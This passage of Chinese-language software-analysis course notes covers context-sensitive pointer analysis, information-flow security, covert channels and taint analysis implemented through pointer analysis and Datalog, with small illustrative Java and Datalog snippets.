<p><strong>上下文不敏感vs上下文敏感（1-Call-Site）</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200825230709085.png" alt="image-20200825230709085"></p>
<p>左边callsite不敏感会产生误报，认为16也会调用Two.get</p>
<h3 id="Object-Sensitivity"><a href="#Object-Sensitivity" class="headerlink" title="Object Sensitivity"></a>Object Sensitivity</h3><p><strong>原理</strong>：针对面向对象语言，<strong>用<code>receiver object</code>来表示上下文</strong>。对比1层的调用点敏感和对象敏感，时间和准确性上对象敏感显然更优，这是由面向对象语言的特点所确定的。</p>
<blockquote>
<p> Select(c,l,<strong>c’:oi</strong>,m) = [oj, … , ok, oi] （c’ = [oj, … , ok]）</p>
</blockquote>
<p><strong>示例</strong>：选取1-object，最终pt(x)=o3。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826010740396.png" alt="image-20200826010740396"></p>
<p><strong>对比</strong>：对比<code>1-Call-Site</code>和<code>1-object</code>上下文，在这个示例中<code>1-object</code>明显更准确。原因是面向对象语言的特性，多态性产生很多继承链，一层一层调用子对象，其中最关键的是<code>receiver object</code>，<code>receiver object</code>决定了调用者的根源。本例有多层调用，若采用2-Call-Site就不会出错。</p>
<p>规律：this所指的变量一定是自己的上下文</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826011344657.png" alt="image-20200826011344657"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826011439285.png" alt="image-20200826011439285"></p>
<p><strong>示例2</strong>：在本示例中，<code>1-Call-Site</code>明显更准确。因为同一个<code>receiver object</code>用不同参数多次调用了子函数，导致局部变量无法区分。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826012027064.png" alt="image-20200826012027064"></p>
<p><strong>结论</strong>：所以理论上，object敏感与callsite敏感的准确度无法比较。但是<strong>对于面向对象语言，object敏感的准确度和效率要优于callsite敏感</strong>。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826012335207.png" alt="image-20200826012335207"></p>
<h3 id="Type-Sensitivity"><a href="#Type-Sensitivity" class="headerlink" title="Type Sensitivity"></a>Type Sensitivity</h3><p><strong>原理</strong>：牺牲精度，提高速度。<strong>基于创建点所在类的类型</strong>，是<strong>基于对象敏感粗粒度的抽象</strong>，精度较低。</p>
<p>调用点所在的类型作为上下文；</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826012857854.png" alt="image-20200826012857854"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826012846362.png" alt="image-20200826012846362"></p>
<h3 id="总体对比"><a href="#总体对比" class="headerlink" title="总体对比"></a>总体对比</h3><p><strong>精度</strong>：object &gt; type &gt; call-site</p>
<p><strong>效率</strong>：type &gt; object &gt; call-site</p>
<p>本课老师提出选择上下文的方法，对代码的特点有针对性的选择上下文方法。</p>
<p>Java分析不需要流敏感，开销太大了，效果不明显。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826013113164.png" alt="image-20200826013113164"></p>
<h1 id="12-amp-13"><a href="#12-amp-13" class="headerlink" title="12 &amp; 13"></a>12 &amp; 13</h1><p>显示流和隐藏信道，使用污点分析来检测信息流漏洞。</p>
<h2 id="信息流安全"><a href="#信息流安全" class="headerlink" title="信息流安全"></a>信息流安全</h2><p><strong>访问控制</strong>：关注信息访问。但是程序获得信息之后去做了什么，访问控制监管不到。</p>
<p><strong>信息流安全</strong>：关注信息传播。保证程序以安全的程序处理信息，防止泄露。</p>
<p><strong>信息流</strong>：<code>x-&gt;y</code>表示x的值流向y。</p>
<p><strong>信息等级</strong>：对不同<strong>变量</strong>进行<strong>分级</strong>，即安全等级，H-高密级，L-低密级。可以用格进行分类，给优先级排序。</p>
<p><strong>安全策略</strong>：非干涉策略，高密级变量H的信息不能影响（流向）低密级变量L。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826134802054.png" alt="image-20200826134802054"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826135734797.png" alt="image-20200826135734797"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826140309150.png" alt="image-20200826140309150"></p>
<h2 id="机密性和完整性"><a href="#机密性和完整性" class="headerlink" title="机密性和完整性"></a>机密性和完整性</h2><p><strong>保密性</strong>—信息泄露，读保护；<strong>完整性</strong>—信息篡改，写保护。</p>
<p><strong>完整性错误类型</strong>：命令注入、SQL注入、XSS攻击、… 。都属于注入错误。</p>
<p><strong>完整性更宽泛的定义</strong>：准确性、完整性、一致性。准确性表示关键数据不被不可信数据破坏；完整性表示系统存储了所有的数据；一致性表示发送的数据和接收的数据是一致的。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826140937303.png" alt="image-20200826140937303"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826141241983.png" alt="image-20200826141241983"></p>
<h2 id="显示流和隐藏信道-Explicit-Flows-and-Covert-Channels"><a href="#显示流和隐藏信道-Explicit-Flows-and-Covert-Channels" class="headerlink" title="显示流和隐藏信道-Explicit Flows and Covert Channels"></a>显示流和隐藏信道-Explicit Flows and Covert Channels</h2><p><strong>显示流</strong>：直接用<code>=</code>数值传递。由于显示流能泄露更多信息，所以本课程关注显示流的信息泄露。</p>
<p><strong>隐式信息流—侧信道</strong>：程序可能会以一些意想不到的方式泄露数据。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Eg1 隐式流</span></span><br><span class="line"><span class="keyword">if</span> (secret_H &lt; <span class="number">0</span>) </span><br><span class="line">  public_L = <span class="number">1</span>; </span><br><span class="line"><span class="keyword">else</span> Public_L = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// Eg2 终止信道</span></span><br><span class="line"><span class="keyword">while</span>(secret_H &lt; <span class="number">0</span>) &#123; ... &#125;;</span><br><span class="line"><span class="comment">// Eg3 时间信道</span></span><br><span class="line"><span class="keyword">if</span> (secret_H &lt; <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; <span class="number">1000000</span>; ++i) &#123; ... &#125;;</span><br><span class="line"><span class="comment">// Eg4 异常</span></span><br><span class="line"><span class="keyword">if</span> (secret_H &lt; <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"..."</span>);</span><br><span class="line"><span class="comment">// Eg5 如果访问数组越界，则可以推断secret可以为负数</span></span><br><span class="line"><span class="keyword">int</span> sa_H[] = getSecretArray();</span><br><span class="line">sa_H[secret_H] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826145727101.png" alt="image-20200826145727101"></p>
<p><strong>Covert Channels</strong>：信道指的是传递信息的机制，convert_channel指的是那些原本目的不是为了传递信息的信道。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826154238766.png" alt="image-20200826154238766"></p>
<h2 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h2><p><strong>说明</strong>：使用最广的<strong>信息流分析技术</strong>，需将程序数据分为两类，把感兴趣的数据标记为污点数据。</p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong><code>Sources</code> &amp; <code>Sink</code></strong>：</p>
<p><code>Sources</code>是污点数据的源，<strong>一般是某些方法的返回值</strong>，如<code>read()</code>；</p>
<p><code>Sink</code>是特定的程序点，某些敏感函数。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826155325353.png" alt="image-20200826155325353"></p>
<p><strong>保密性</strong>：Source是秘密数据，Sink是泄露点，信息泄露漏洞。</p>
<p><strong>完整性</strong>：Source是不可信数据，Sink是关键计算，注入漏洞。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826155805722.png" alt="image-20200826155805722"></p>
<h3 id="污点分析具体规则"><a href="#污点分析具体规则" class="headerlink" title="污点分析具体规则"></a>污点分析具体规则</h3><p><strong>定义</strong>：关注的是，<strong>一个污点数据是否能流向sink点</strong>。或者说，<strong>指向sink点处的指针会不会指向污点数据</strong>。</p>
<p>污点分析更关心数据，而不是变量，是对数据打标签。</p>
<p><strong>TA/PTA对比</strong>：污点分析与指针分析，一个是污点数据的流向，一个是抽象对象的流向。</p>
<p>指针分析其实就是盯着程序中的抽象对象的流向，</p>
<p>思想：</p>
<blockquote>
<p>可把污点数据看作是                                                                                                                                                                                            </p>
<p>特殊的对象</p>
<p>source看作这些对象的allocation-site</p>
<p>借助指针分析来实现污点分析</p>
</blockquote>
<p><strong>标记</strong>：t<sub>i</sub>表示调用点i(call site i)返回的污点数据，t<sub>i</sub>指针集就包含普通对象+污点数据。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826160638720.png" alt="image-20200826160638720"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826161010695.png" alt="image-20200826161010695"></p>
<p><strong>规则</strong>：</p>
<ol>
<li>Source：先看CG图，如果程序有语句在l处调用了m方法，有调用边。条件是如果m属于分析的Source方法集合内，那么我们就把返回值标记为污点值tl，更新返回值r的指向。</li>
<li>Sink：在Sink的调用点检查就可以了。主要就是看调用点的调用目标方法，如果目标方法属于Sink集合，那么就开始<strong>检查参数，遍历参数，看参数他们的指针集</strong>。如果指针集之中发现了污点数据，那么就产生了TaintFlows，会报告说污点数据tj会流到m方法中。</li>
</ol>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826162027035.png" alt="image-20200826162027035"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826162045978.png" alt="image-20200826162045978"></p>
<p><strong>示例</strong>：第3行产生新对象o11的同时，产生的污点数据t3；最终指针分析发现，t3会流向sink函数<code>log()</code>。</p>
<p>理解：</p>
<p>首先x指向o2，pw指向o11这个对象。由于getPassword方法是一个Source方法，那么就会触发处理source规则，会生成taint对象，上下文目前是在第三行，那么就是t3，加入到pw的指针集里面。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826163420112.png" alt="image-20200826163420112"></p>
<p>实现分析器用到：分析Java用Soot/WALA；分析C++用LLVM；有的用Datalog实现分析器（如DOOP分析框架）。</p>
<p>LLVM指针分析工具：SVF</p>
<h1 id="14"><a href="#14" class="headerlink" title="14"></a>14</h1><p>Datalog语法，如何利用Datalog实现指针分析和污点分析。</p>
<p>本节课内容讲到了很多数据逻辑方面的应用，单上数理逻辑会觉得理论性太强，单上这节课的应用知识又觉得理论上不够严谨，总之算是一种互补。</p>
<h2 id="Motivation-1"><a href="#Motivation-1" class="headerlink" title="Motivation"></a>Motivation</h2><p><strong>内容</strong>：了解命令式 vs 声明式语言，对比两种语言实现指针分析算法的优劣。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 问题：从一群人中挑出成年人。</span></span><br><span class="line"><span class="comment">// 命令式语言(Imperative)：详细的命令机器怎么（How）去处理一件事情以达到你想要的结果（What）。如Java</span></span><br><span class="line"><span class="function">Set&lt;Person&gt; <span class="title">selectAdults</span><span class="params">(Set&lt;Person&gt; persons)</span> </span>&#123; </span><br><span class="line">  Set&lt;Person&gt; result = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">  <span class="keyword">for</span> (Person person : persons)</span><br><span class="line">    <span class="keyword">if</span> (person.getAge() &gt;= <span class="number">18</span>)</span><br><span class="line">      result.add(person);</span><br><span class="line">    <span class="keyword">return</span> result; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 声明式语言(Declarative)：只告诉你想要的结果（What），机器自己摸索过程（How）。如SQL，代码更简洁</span></span><br><span class="line">SELECT * FROM Persons WHERE Age &gt;= <span class="number">18</span>;</span><br></pre></td></tr></table></figure>

<p><strong>命令式语言—PTA</strong>：若采用命令式实现指针分析算法，实现复杂。需考虑<code>worklist</code>数据结构，是数组list还是链表，是先进先出还是先进后出；如何表示指针集合，hash集还是bit向量；如何关联PFG节点和指针；如何处理相关语句中的变量。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826203231609.png" alt="image-20200826203231609"></p>
<p><strong>声明式语言—PTA</strong>：如何用声明式语言实现PTA？优点是简洁、可读性强、易于实现，例如Datalog。缺点是不方便表达复杂逻辑（Eg，for all全部满足）、不能控制性能。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826204036519.png" alt="image-20200826204036519"></p>
<h2 id="Datalog介绍"><a href="#Datalog介绍" class="headerlink" title="Datalog介绍"></a>Datalog介绍</h2><p><strong>Datalog</strong>（Data + Logic）：是声明式逻辑编程语言，可读性强，最初用于数据库。现在可用于程序分析、大数据、云计算。特点—没有副作用、没有控制流、没有函数、非图灵完备（精简了许多功能）。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826204209021.png" alt="image-20200826204209021"></p>
<h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><p>谓词，原子。</p>
<p><strong>谓词Predicate</strong>：看作一系列陈述的集合，陈述某事情是不是事实（真假）。如Age表，表示一些人的年龄。</p>
<p><strong>事实fact</strong>：特定值的组合。Eg，(“Xiaoming”, 18)。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826210136864.png" alt="image-20200826210136864"></p>
<p><strong>原子Atom</strong>：<code>P(X1, X2, ... , Xn)</code>。P表示谓词名，Xi表示参数（又叫term，可以是变量或常量）。</p>
<p><code>Age(&quot;Xiaoming&quot;, 18)</code> == true ；</p>
<p><code>Age(&quot;Alan&quot;, 23)</code> == false。</p>
<h3 id="Logic-Rule"><a href="#Logic-Rule" class="headerlink" title="Logic(Rule)"></a>Logic(Rule)</h3><p><strong>Rule</strong>：表示逻辑推导规则，若<code>Body</code>都为true，则<code>Head</code>为true。<code>H &lt;- B1, B2, ... ,Bn</code>。H是<code>Head</code>，Bi是<code>Body</code>。   Eg，<code>Adult(person) &lt;- Age(person, age), age &gt;= 18</code>。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826211230895.png" alt="image-20200826211230895"></p>
<p><strong>Rule要求</strong>：规则中的值要有限，如<code>A(x) &lt;- B(y), x &gt; y</code>；规则不能有悖论，如<code>A(x) &lt;- B(x), !A(x)</code>。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826212936379.png" alt="image-20200826212936379"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826212953538.png" alt="image-20200826212953538"></p>
<p><strong>Datalog中逻辑或</strong>：A或B都可推导出C，可写成<code>C&lt;-A. C&lt;-B.</code>或者<code>C&lt;-A;B.</code>，与的优先级高于或。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826213916653.png" alt="image-20200826213916653"></p>
<p><strong>Datalog中逻辑非</strong>：<code>!B(...)</code>。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826214144125.png" alt="image-20200826214144125"></p>
<h3 id="Datalog谓词分类"><a href="#Datalog谓词分类" class="headerlink" title="Datalog谓词分类"></a>Datalog谓词分类</h3><p>EDB（extensional database）外延数据库：谓词需预先定义，关系不可变，可被当做输入。</p>
<p>IDB（intensional database）内涵数据库：谓词是根据规则建立的，关系是根据规则推导的，可被看作是是输出。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826213540508.png" alt="image-20200826213540508"></p>
<p><strong>说明</strong>：<code>H &lt;- B1, B2, ... ,Bn</code>，H只能是IDB，Bi可以是EDB或IDB。</p>
<p><strong>递归性</strong>：Datalog支持递归，也即能够推导出自身。</p>
<p>Eg，</p>
<p><code>Reach(from, to) &lt;- Edge(from, to)</code>；</p>
<p><code>Reach(from, to) &lt;- Reach(from, node), Edge(node, to)</code>.</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826214438975.png" alt="image-20200826214438975"></p>
<h3 id="Datalog程序运行"><a href="#Datalog程序运行" class="headerlink" title="Datalog程序运行"></a>Datalog程序运行</h3><p><strong>Datalog程序运行</strong>：输入EDB+rules到Datalog引擎，输出IDB。常用Datalog引擎——LogicBlox, Soufflé, XSB, Datomic, Flora-2。</p>
<p><strong>Datalog程序性质</strong>：单调性、终止性。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826221132542.png" alt="image-20200826221132542"></p>
<h3 id="Datalog实现指针分析"><a href="#Datalog实现指针分析" class="headerlink" title="Datalog实现指针分析"></a>Datalog实现指针分析</h3><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p><strong>EDB</strong>：程序句法上可获得的指针相关信息。如<code>New</code> / <code>Assign</code> / <code>Store</code> / <code>Load</code>语句。V-变量，F-域，O-对象。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826222753564.png" alt="image-20200826222753564"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826222742365.png" alt="image-20200826222742365"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826223142375.png" alt="image-20200826223142375"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826224003312.png" alt="image-20200826224003312"></p>
<h2 id="上下文不敏感PTA示例"><a href="#上下文不敏感PTA示例" class="headerlink" title="上下文不敏感PTA示例"></a>上下文不敏感PTA示例</h2><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826225153922.png" alt="image-20200826225153922"></p>
<p><strong>步骤</strong>：其实指令处理顺序不固定。</p>
<ol>
<li>首先将EDB（指令）表示成表格数据形式。</li>
<li>处理<code>New</code>指令</li>
<li>处理<code>Assign</code>指令</li>
<li>处理<code>Store</code>指令</li>
<li>处理<code>Load</code>指令</li>
</ol>
<h2 id="全程序指针分析-上下文敏感"><a href="#全程序指针分析-上下文敏感" class="headerlink" title="全程序指针分析-上下文敏感"></a>全程序指针分析-上下文敏感</h2><p><strong>call指令规则</strong>：S—指令，M—方法。共3条rule。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826225740559.png" alt="image-20200826225740559"></p>
<p>VCall：就是表示callsite，调用指令上下文位置l，变量x，方法k；</p>
<p>Dispatch：根据对象o，给定调用的方法k，去找到实际调用的方法m；</p>
<p>ThisVar：获取实际调用的方法m中的this变量</p>
<p>Reachable：表示方法m可达</p>
<p>CallGraph：表示l到m有一条边，可达</p>
<ol>
<li>首先找到调用的目标函数m，传递this指针。</li>
</ol>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826230255993.png" alt="image-20200826230255993"></p>
<ol start="2">
<li>传递参数</li>
</ol>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826230814620.png" alt="image-20200826230814620"></p>
<p>形参-&gt;实参-&gt;o</p>
<ol start="3">
<li>传返回值</li>
</ol>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826231316170.png" alt="image-20200826231316170"></p>
<p>三条规则的合影：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200826231327413.png" alt="image-20200826231327413"></p>
<p><strong>全程序指针分析</strong>：引入程序入口函数m。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200827104907724.png" alt="image-20200827104907724"></p>
<h2 id="Datalog实现污点分析"><a href="#Datalog实现污点分析" class="headerlink" title="Datalog实现污点分析"></a>Datalog实现污点分析</h2><p><strong>EDB谓词-输入</strong>：</p>
<ul>
<li>Source(m : <strong>M</strong>)         ——   产生污点源的函数</li>
<li>Sink(m : <strong>M</strong>)              ——   <code>sink</code>函数</li>
<li>Taint(l : <strong>S</strong>, t : <strong>T</strong>)        ——   关联某<code>callsite</code> l和它产生的污点数据t</li>
</ul>
<p><strong>IDB谓词-输出</strong>：</p>
<ul>
<li>TaintFlow(t : <strong>T</strong>, m : <strong>M</strong>)     ——  表示污点数据t会流向<code>sink</code>函数m</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200827110020773.png" alt="image-20200827110020773"></p>
<p><strong>规则</strong>：处理<code>source</code>和<code>sink</code>函数。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200827152049773.png" alt="image-20200827152049773"></p>
